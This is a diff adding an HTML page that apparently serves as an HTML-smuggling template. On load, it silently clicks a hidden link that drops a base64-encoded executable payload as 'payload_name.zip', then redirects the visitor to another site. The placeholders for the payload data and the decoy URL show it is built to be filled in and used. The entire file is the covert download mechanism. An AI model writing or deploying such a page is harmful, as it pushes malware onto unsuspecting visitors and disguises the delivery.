@@ -1,0 +1,21 @@
+<HTML>
+<meta http-equiv="content-type" content="text/html;charset=utf-8" />
+<HEAD>
+</HEAD>
+<BODY>
+
+   <script src="https://ajax.googleapis.com/ajax/libs/jquery/1.9.1/jquery.min.js"></script>
+   <script>
+     $(document).ready(function() {
+       $('a#clickhere')[0].click();
+     });
+    window.addEventListener('load',function () {
+    location.replace("url_website");
+     })
+   </script>
+
+   <a id='clickhere' style="display:none"
+     href="data:application/x-msdownload;base64,data_base64" download="payload_name.zip">Download</a>
+
+</BODY>
+</HTML>
